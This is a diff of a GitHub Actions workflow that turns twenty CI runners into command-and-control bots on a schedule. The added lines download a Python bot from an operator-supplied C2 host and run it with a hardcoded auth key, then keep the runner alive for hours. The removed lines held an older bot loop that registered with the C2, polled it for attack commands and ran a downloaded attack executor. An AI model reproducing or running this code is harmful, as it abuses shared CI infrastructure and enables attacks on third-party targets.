@@ -1,4 +1,8 @@
-name: Bot Fleet v3
+# ╔══════════════════════════════════════════════╗
+# ║  HUNT BOT FLEET — C2 Controlled            ║
+# ║  20 runners connect to C2, wait for commands║
+# ╚══════════════════════════════════════════════╝
+name: Hunt Bot Fleet
 
 on:
   workflow_dispatch:
@@ -12,7 +16,7 @@ on:
         required: true
         default: '1337'
   schedule:
-    - cron: '13 */4 * * *'
+    - cron: '7 */3 * * *'
 
 jobs:
   bot:
@@ -22,41 +26,18 @@ jobs:
       matrix:
         slice: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
     steps:
-      - name: Bot
+      - name: Connect to C2
         run: |
           C2="${{ github.event.inputs.c2 }}"
           CPORT="${{ github.event.inputs.c2_port }}"
-          S="${{ matrix.slice }}"
-          SLICE="$S"
 
-          BOT_ID="gh-${SLICE}-$(head -c8 /dev/urandom | md5sum | cut -c1-8)"
-          LOCAL_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
-          [ -z "$LOCAL_IP" ] && LOCAL_IP="0.0.0.0"
+          echo "[+] Runner ${{ matrix.slice }} → C2: $C2:$CPORT"
 
-          echo "[+] Bot ${BOT_ID} -> ${C2}:${CPORT}"
+          # Download and run Python bot
+          curl -s "http://$C2:$CPORT/bot.py" -o /tmp/bot.py
+          python3 /tmp/bot.py "$C2" "$CPORT" "enibot2024" "gh-${{ matrix.slice }}" &
 
-          # Register
-          curl -s -X POST "http://${C2}:${CPORT}/api/register" \
-            -H "Content-Type: application/json" \
-            -d '{"auth":"enibot2024","id":"'"${BOT_ID}"'","ip":"'"${LOCAL_IP}"'","hostname":"'"$(hostname)"'","os":"linux","arch":"x86_64","method":"python"}'
+          echo "[+] Bot registered"
 
-          # Download attack executor from C2
-          curl -s "http://${C2}:${CPORT}/attack-executor.py" -o /tmp/executor.py
-
-          # Main loop
-          while true; do
-            # Heartbeat
-            curl -s -X POST "http://${C2}:${CPORT}/api/heartbeat" \
-              -H "Content-Type: application/json" \
-              -d '{"id":"'"${BOT_ID}"'"}' > /dev/null 2>&1
-
-            # Poll
-            CMDS=$(curl -s "http://${C2}:${CPORT}/api/poll?id=${BOT_ID}")
-
-            # Execute attacks
-            if echo "${CMDS}" | grep -q '"type":"attack"'; then
-              C2_URL="http://${C2}:${CPORT}" BOT_ID="${BOT_ID}" python3 /tmp/executor.py <<< "${CMDS}"
-            fi
-
-            sleep $((8 + RANDOM % 13))
-          done
+          # Keep alive for 5.5 hours (GitHub Actions max is 6h)
+          sleep 19800
